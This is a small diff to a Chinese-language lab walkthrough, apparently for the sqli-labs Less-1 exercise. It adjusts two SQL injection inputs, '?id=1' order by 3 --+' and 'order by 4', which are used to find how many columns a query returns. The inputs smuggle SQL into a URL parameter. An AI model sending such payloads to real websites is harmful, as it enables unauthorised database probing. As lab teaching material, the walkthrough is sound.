@@ -87,15 +87,13 @@
 1. 注入<code>?id=1'order by 3 --+</code>和<code>?id=1'order by 4 --+</code> 知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数
 
 ~~~ shell
-?id=1'order by 3 --+
-?id=1'order by 4 --+
+?id=1' order by 3 --+
+?id=1' order by 4 --+
 ~~~
 
 ![Less-1_7](./img/Less-1_7.png)
 
 ![Less-1_8](./img/Less-1_8.png)
-
-
 
 ![Less-1_9](./img/Less-1_9.png)
 
